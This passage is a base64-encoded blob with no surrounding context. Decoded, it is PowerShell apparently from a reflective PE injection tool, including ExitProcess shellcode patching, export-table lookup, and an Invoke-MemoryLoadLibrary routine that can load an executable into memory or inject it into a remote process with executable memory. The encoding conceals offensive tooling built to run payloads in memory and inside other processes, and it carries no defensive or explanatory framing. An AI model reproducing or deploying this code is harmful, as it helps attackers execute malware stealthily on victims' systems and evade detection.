jY2VzcyAtZXEgJGZhbHNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiQ2FsbCB0byBWaXJ0dWFsUHJvdGVjdCBmYWlsZWQiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICNNYWtlIGNvcHkgb2Ygb3JpZ2luYWwgRXhpdFByb2Nlc3MgYnl0ZXMKICAgICAgICAgICAgJEV4aXRQcm9jZXNzT3JpZ0J5dGVzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb3RhbFNpemUpCiAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5tZW1jcHkuSW52b2tlKCRFeGl0UHJvY2Vzc09yaWdCeXRlc1B0ciwgJFByb2NFeGl0RnVuY3Rpb25BZGRyLCBbVUludDY0XSRUb3RhbFNpemUpIHwgT3V0LU51bGwKICAgICAgICAgICAgJFJldHVybkFycmF5ICs9ICwoJFByb2NFeGl0RnVuY3Rpb25BZGRyLCAkRXhpdFByb2Nlc3NPcmlnQnl0ZXNQdHIsICRUb3RhbFNpemUpCiAgICAgICAgICAgIAogICAgICAgICAgICAjV3JpdGUgdGhlIEV4aXRUaHJlYWQgc2hlbGxjb2RlIHRvIG1lbW9yeS4gVGhpcyBzaGVsbGNvZGUgd2lsbCB3cml0ZSAweDAxIHRvIEV4ZURvbmVCeXRlUHRyIGFkZHJlc3MgKHNvIFBTIGtub3dzIHRoZSBFWEUgaXMgZG9uZSksIHRoZW4gCiAgICAgICAgICAgICMgICBjYWxsIEV4aXRUaHJlYWQKICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTEgLU1lbW9yeUFkZHJlc3MgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wCiAgICAgICAgICAgICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCAoJFNoZWxsY29kZTEuTGVuZ3RoKQogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkRXhlRG9uZUJ5dGVQdHIsICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCwgJGZhbHNlKQogICAgICAgICAgICAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgJFB0clNpemUKICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTIgLU1lbW9yeUFkZHJlc3MgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wCiAgICAgICAgICAgICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCAoJFNoZWxsY29kZTIuTGVuZ3RoKQogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkRXhpdFRocmVhZEFkZHIsICRQcm9jRXhpdEZ1bmN0aW9uQWRkclRtcCwgJGZhbHNlKQogICAgICAgICAgICAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkUHJvY0V4aXRGdW5jdGlvbkFkZHJUbXAgJFB0clNpemUKICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTMgLU1lbW9yeUFkZHJlc3MgJFByb2NFeGl0RnVuY3Rpb25BZGRyVG1wCgogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRQcm9jRXhpdEZ1bmN0aW9uQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKICAgICAgICB9CiAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKICAgICAgICBXcml0ZS1PdXRwdXQgJFJldHVybkFycmF5CiAgICB9CiAgICAKICAgIAogICAgI1RoaXMgZnVuY3Rpb24gdGFrZXMgYW4gYXJyYXkgb2YgYXJyYXlzLCB0aGUgaW5uZXIgYXJyYXkgb2YgZm9ybWF0IEAoJERlc3RBZGRyLCAkU291cmNlQWRkciwgJENvdW50KQogICAgIyAgIEl0IGNvcGllcyBDb3VudCBieXRlcyBmcm9tIFNvdXJjZSB0byBEZXN0aW5hdGlvbi4KICAgIEZ1bmN0aW9uIENvcHktQXJyYXlPZk1lbUFkZHJlc3NlcwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0FycmF5W11dCiAgICAgICAgJENvcHlJbmZvLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgKQoKICAgICAgICBbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKICAgICAgICBmb3JlYWNoICgkSW5mbyBpbiAkQ29weUluZm8pCiAgICAgICAgewogICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEluZm9bMF0sIFtVSW50MzJdJEluZm9bMl0sIFtVSW50MzJdJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUsIFtSZWZdJE9sZFByb3RlY3RGbGFnKQogICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkV2luMzJGdW5jdGlvbnMubWVtY3B5Lkludm9rZSgkSW5mb1swXSwgJEluZm9bMV0sIFtVSW50NjRdJEluZm9bMl0pIHwgT3V0LU51bGwKICAgICAgICAgICAgCiAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEluZm9bMF0sIFtVSW50MzJdJEluZm9bMl0sIFtVSW50MzJdJE9sZFByb3RlY3RGbGFnLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykgfCBPdXQtTnVsbAogICAgICAgIH0KICAgIH0KCgogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgIyMjIyMjIyMjIyAgICBGVU5DVElPTlMgICAjIyMjIyMjIyMjIwogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgRnVuY3Rpb24gR2V0LU1lbW9yeVByb2NBZGRyZXNzCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRQRUhhbmRsZSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZ1bmN0aW9uTmFtZQogICAgICAgICkKICAgICAgICAKICAgICAgICAkV2luMzJUeXBlcyA9IEdldC1XaW4zMlR5cGVzCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzID0gR2V0LVdpbjMyQ29uc3RhbnRzCiAgICAgICAgJFBFSW5mbyA9IEdldC1QRURldGFpbGVkSW5mbyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMKICAgICAgICAKICAgICAgICAjR2V0IHRoZSBleHBvcnQgdGFibGUKICAgICAgICBpZiAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkV4cG9ydFRhYmxlLlNpemUgLWVxIDApCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gW0ludFB0cl06Olplcm8KICAgICAgICB9CiAgICAgICAgJEV4cG9ydFRhYmxlUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5FeHBvcnRUYWJsZS5WaXJ0dWFsQWRkcmVzcykKICAgICAgICAkRXhwb3J0VGFibGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkRXhwb3J0VGFibGVQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0VYUE9SVF9ESVJFQ1RPUlkpCiAgICAgICAgCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkRXhwb3J0VGFibGUuTnVtYmVyT2ZOYW1lczsgJGkrKykKICAgICAgICB7CiAgICAgICAgICAgICNBZGRyZXNzT2ZOYW1lcyBpcyBhbiBhcnJheSBvZiBwb2ludGVycyB0byBzdHJpbmdzIG9mIHRoZSBuYW1lcyBvZiB0aGUgZnVuY3Rpb25zIGV4cG9ydGVkCiAgICAgICAgICAgICROYW1lT2Zmc2V0UHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUhhbmRsZSkgKCRFeHBvcnRUYWJsZS5BZGRyZXNzT2ZOYW1lcyArICgkaSAqIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bVUludDMyXSkpKQogICAgICAgICAgICAkTmFtZVB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkTmFtZU9mZnNldFB0ciwgW1R5cGVdW1VJbnQzMl0pKQogICAgICAgICAgICAkTmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgkTmFtZVB0cikKCiAgICAgICAgICAgIGlmICgkTmFtZSAtY2VxICRGdW5jdGlvbk5hbWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNBZGRyZXNzT2ZOYW1lT3JkaW5hbHMgaXMgYSB0YWJsZSB3aGljaCBjb250YWlucyBwb2ludHMgdG8gYSBXT1JEIHdoaWNoIGlzIHRoZSBpbmRleCBpbiB0byBBZGRyZXNzT2ZGdW5jdGlvbnMKICAgICAgICAgICAgICAgICMgICAgd2hpY2ggY29udGFpbnMgdGhlIG9mZnNldCBvZiB0aGUgZnVuY3Rpb24gaW4gdG8gdGhlIERMTAogICAgICAgICAgICAgICAgJE9yZGluYWxQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoJEV4cG9ydFRhYmxlLkFkZHJlc3NPZk5hbWVPcmRpbmFscyArICgkaSAqIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bVUludDE2XSkpKQogICAgICAgICAgICAgICAgJEZ1bmNJbmRleCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRPcmRpbmFsUHRyLCBbVHlwZV1bVUludDE2XSkKICAgICAgICAgICAgICAgICRGdW5jT2Zmc2V0QWRkciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpICgkRXhwb3J0VGFibGUuQWRkcmVzc09mRnVuY3Rpb25zICsgKCRGdW5jSW5kZXggKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQzMl0pKSkKICAgICAgICAgICAgICAgICRGdW5jT2Zmc2V0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEZ1bmNPZmZzZXRBZGRyLCBbVHlwZV1bVUludDMyXSkKICAgICAgICAgICAgICAgIHJldHVybiBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSGFuZGxlKSAoJEZ1bmNPZmZzZXQpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuIFtJbnRQdHJdOjpaZXJvCiAgICB9CgoKICAgIEZ1bmN0aW9uIEludm9rZS1NZW1vcnlMb2FkTGlicmFyeQogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUgKV0KICAgICAgICBbQnl0ZVtdXQogICAgICAgICRQRUJ5dGVzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEV4ZUFyZ3MsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUmVtb3RlUHJvY0hhbmRsZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMpXQogICAgICAgIFtCb29sXQogICAgICAgICRGb3JjZUFTTFIgPSAkZmFsc2UKICAgICAgICApCiAgICAgICAgCiAgICAgICAgJFB0clNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pCiAgICAgICAgCiAgICAgICAgI0dldCBXaW4zMiBjb25zdGFudHMgYW5kIGZ1bmN0aW9ucwogICAgICAgICRXaW4zMkNvbnN0YW50cyA9IEdldC1XaW4zMkNvbnN0YW50cwogICAgICAgICRXaW4zMkZ1bmN0aW9ucyA9IEdldC1XaW4zMkZ1bmN0aW9ucwogICAgICAgICRXaW4zMlR5cGVzID0gR2V0LVdpbjMyVHlwZXMKICAgICAgICAKICAgICAgICAkUmVtb3RlTG9hZGluZyA9ICRmYWxzZQogICAgICAgIGlmICgoJFJlbW90ZVByb2NIYW5kbGUgLW5lICRudWxsKSAtYW5kICgkUmVtb3RlUHJvY0hhbmRsZSAtbmUgW0ludFB0cl06Olplcm8pKQogICAgICAgIHsKICAgICAgICAgICAgJFJlbW90ZUxvYWRpbmcgPSAkdHJ1ZQogICAgICAgIH0KICAgICAgICAKICAgICAgICAjR2V0IGJhc2ljIFBFIGluZm9ybWF0aW9uCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiR2V0dGluZyBiYXNpYyBQRSBpbmZvcm1hdGlvbiBmcm9tIHRoZSBmaWxlIgogICAgICAgICRQRUluZm8gPSBHZXQtUEVCYXNpY0luZm8gLVBFQnl0ZXMgJFBFQnl0ZXMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKICAgICAgICAkT3JpZ2luYWxJbWFnZUJhc2UgPSAkUEVJbmZvLk9yaWdpbmFsSW1hZ2VCYXNlCiAgICAgICAgJE5YQ29tcGF0aWJsZSA9ICR0cnVlCiAgICAgICAgaWYgKCgkUEVJbmZvLkRsbENoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCkgLW5lICRXaW4zMkNvbnN0YW50cy5JTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTlhfQ09NUEFUKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiUEUgaXMgbm90IGNvbXBhdGlibGUgd2l0aCBERVAsIG1pZ2h0IGNhdXNlIGlzc3VlcyIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKICAgICAgICAgICAgJE5YQ29tcGF0aWJsZSA9ICRmYWxzZQogICAgICAgIH0KICAgICAgICAKICAgICAgICAKICAgICAgICAjVmVyaWZ5IHRoYXQgdGhlIFBFIGFuZCB0aGUgY3VycmVudCBwcm9jZXNzIGFyZSB0aGUgc2FtZSBiaXRzICgzMmJpdCBvciA2NGJpdCkKICAgICAgICAkUHJvY2VzczY0Qml0ID0gJHRydWUKICAgICAgICBpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgJEtlcm5lbDMySGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoImtlcm5lbDMyLmRsbCIpCiAgICAgICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRLZXJuZWwzMkhhbmRsZSwgIklzV293NjRQcm9jZXNzIikKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiQ291bGRuJ3QgbG9jYXRlIElzV293NjRQcm9jZXNzIGZ1bmN0aW9uIHRvIGRldGVybWluZSBpZiB0YXJnZXQgcHJvY2VzcyBpcyAzMmJpdCBvciA2NGJpdCIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgW0Jvb2xdJFdvdzY0UHJvY2VzcyA9ICRmYWxzZQogICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5Jc1dvdzY0UHJvY2Vzcy5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtSZWZdJFdvdzY0UHJvY2VzcykKICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIElzV293NjRQcm9jZXNzIGZhaWxlZCIKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgKCgkV293NjRQcm9jZXNzIC1lcSAkdHJ1ZSkgLW9yICgoJFdvdzY0UHJvY2VzcyAtZXEgJGZhbHNlKSAtYW5kIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pIC1lcSA0KSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRQcm9jZXNzNjRCaXQgPSAkZmFsc2UKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgI1Bvd2VyU2hlbGwgbmVlZHMgdG8gYmUgc2FtZSBiaXQgYXMgdGhlIFBFIGJlaW5nIGxvYWRlZCBmb3IgSW50UHRyIHRvIHdvcmsgY29ycmVjdGx5CiAgICAgICAgICAgICRQb3dlclNoZWxsNjRCaXQgPSAkdHJ1ZQogICAgICAgICAgICBpZiAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtbmUgOCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFBvd2VyU2hlbGw2NEJpdCA9ICRmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUG93ZXJTaGVsbDY0Qml0IC1uZSAkUHJvY2VzczY0Qml0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0aHJvdyAiUG93ZXJTaGVsbCBtdXN0IGJlIHNhbWUgYXJjaGl0ZWN0dXJlICh4ODYveDY0KSBhcyBQRSBiZWluZyBsb2FkZWQgYW5kIHJlbW90ZSBwcm9jZXNzIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGlmIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pIC1uZSA4KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUHJvY2VzczY0Qml0ID0gJGZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRQcm9jZXNzNjRCaXQgLW5lICRQRUluZm8uUEU2NEJpdCkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJQRSBwbGF0Zm9ybSBkb2Vzbid0IG1hdGNoIHRoZSBhcmNoaXRlY3R1cmUgb2YgdGhlIHByb2Nlc3MgaXQgaXMgYmVpbmcgbG9hZGVkIGluICgzMi82NGJpdCkiCiAgICAgICAgfQogICAgICAgIAoKICAgICAgICAjQWxsb2NhdGUgbWVtb3J5IGFuZCB3cml0ZSB0aGUgUEUgdG8gbWVtb3J5LiBJZiB0aGUgUEUgc3VwcG9ydHMgQVNMUiwgYWxsb2NhdGUgdG8gYSByYW5kb20gbWVtb3J5IGFkZHJlc3MKICAgICAgICBXcml0ZS1WZXJib3NlICJBbGxvY2F0aW5nIG1lbW9yeSBmb3IgdGhlIFBFIGFuZCB3cml0ZSBpdHMgaGVhZGVycyB0byBtZW1vcnkiCiAgICAgICAgCiAgICAgICAgI0FTTFIgY2hlY2sKICAgICAgICBbSW50UHRyXSRMb2FkQWRkciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJFBFU3VwcG9ydHNBU0xSID0gKCRQRUluZm8uRGxsQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfRFlOQU1JQ19CQVNFKSAtZXEgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0RMTENIQVJBQ1RFUklTVElDU19EWU5BTUlDX0JBU0UKICAgICAgICBpZiAoKC1ub3QgJEZvcmNlQVNMUikgLWFuZCAoLW5vdCAkUEVTdXBwb3J0c0FTTFIpKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiUEUgZmlsZSBiZWluZyByZWZsZWN0aXZlbHkgbG9hZGVkIGlzIG5vdCBBU0xSIGNvbXBhdGlibGUuIElmIHRoZSBsb2FkaW5nIGZhaWxzLCB0cnkgcmVzdGFydGluZyBQb3dlclNoZWxsIGFuZCB0cnlpbmcgYWdhaW4gT1IgdHJ5IHVzaW5nIHRoZSAtRm9yY2VBU0xSIGZsYWcgKGNvdWxkIGNhdXNlIGNyYXNoZXMpIiAtV2FybmluZ0FjdGlvbiBDb250aW51ZQogICAgICAgICAgICBbSW50UHRyXSRMb2FkQWRkciA9ICRPcmlnaW5hbEltYWdlQmFzZQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRGb3JjZUFTTFIgLWFuZCAoLW5vdCAkUEVTdXBwb3J0c0FTTFIpKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiUEUgZmlsZSBkb2Vzbid0IHN1cHBvcnQgQVNMUiBidXQgLUZvcmNlQVNMUiBpcyBzZXQuIEZvcmNpbmcgQVNMUiBvbiB0aGUgUEUgZmlsZS4gVGhpcyBjb3VsZCByZXN1bHQgaW4gYSBjcmFzaC4iCiAgICAgICAgfQoKICAgICAgICBpZiAoJEZvcmNlQVNMUiAtYW5kICRSZW1vdGVMb2FkaW5nKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkNhbm5vdCB1c2UgRm9yY2VBU0xSIHdoZW4gbG9hZGluZyBpbiB0byBhIHJlbW90ZSBwcm9jZXNzLiIgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICB9CiAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1hbmQgKC1ub3QgJFBFU3VwcG9ydHNBU0xSKSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJQRSBkb2Vzbid0IHN1cHBvcnQgQVNMUi4gQ2Fubm90IGxvYWQgYSBub24tQVNMUiBQRSBpbiB0byBhIHJlbW90ZSBwcm9jZXNzIiAtRXJyb3JBY3Rpb24gU3RvcAogICAgICAgIH0KCiAgICAgICAgJFBFSGFuZGxlID0gW0ludFB0cl06Olplcm8gICAgICAgICAgICAgICNUaGlzIGlzIHdoZXJlIHRoZSBQRSBpcyBhbGxvY2F0ZWQgaW4gUG93ZXJTaGVsbAogICAgICAgICRFZmZlY3RpdmVQRUhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvICAgICAjVGhpcyBpcyB0aGUgYWRkcmVzcyB0aGUgUEUgd2lsbCBiZSBsb2FkZWQgdG8uIElmIGl0IGlzIGxvYWRlZCBpbiBQb3dlclNoZWxsLCB0aGlzIGVxdWFscyAkUEVIYW5kbGUuIElmIGl0IGlzIGxvYWRlZCBpbiBhIHJlbW90ZSBwcm9jZXNzLCB0aGlzIGlzIHRoZSBhZGRyZXNzIGluIHRoZSByZW1vdGUgcHJvY2Vzcy4KICAgICAgICBpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgI0FsbG9jYXRlIHNwYWNlIGluIHRoZSByZW1vdGUgcHJvY2VzcywgYW5kIGFsc28gYWxsb2NhdGUgc3BhY2UgaW4gUG93ZXJTaGVsbC4gVGhlIFBFIHdpbGwgYmUgc2V0dXAgaW4gUG93ZXJTaGVsbCBhbmQgY29waWVkIHRvIHRoZSByZW1vdGUgcHJvY2VzcyB3aGVuIGl0IGlzIHNldHVwCiAgICAgICAgICAgICRQRUhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQogICAgICAgICAgICAKICAgICAgICAgICAgI3RvZG8sIGVycm9yIGhhbmRsaW5nIG5lZWRzIHRvIGRlbGV0ZSB0aGlzIG1lbW9yeSBpZiBhbiBlcnJvciBoYXBwZW5zIGFsb25nIHRoZSB3YXkKICAgICAgICAgICAgJEVmZmVjdGl2ZVBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvY0V4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJExvYWRBZGRyLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpCiAgICAgICAgICAgIGlmICgkRWZmZWN0aXZlUEVIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MuIElmIHRoZSBQRSBiZWluZyBsb2FkZWQgZG9lc24ndCBzdXBwb3J0IEFTTFIsIGl0IGNvdWxkIGJlIHRoYXQgdGhlIHJlcXVlc3RlZCBiYXNlIGFkZHJlc3Mgb2YgdGhlIFBFIGlzIGFscmVhZHkgaW4gdXNlIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkTlhDb21wYXRpYmxlIC1lcSAkdHJ1ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvYy5JbnZva2UoJExvYWRBZGRyLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQogICAgICAgICAgICB9CiA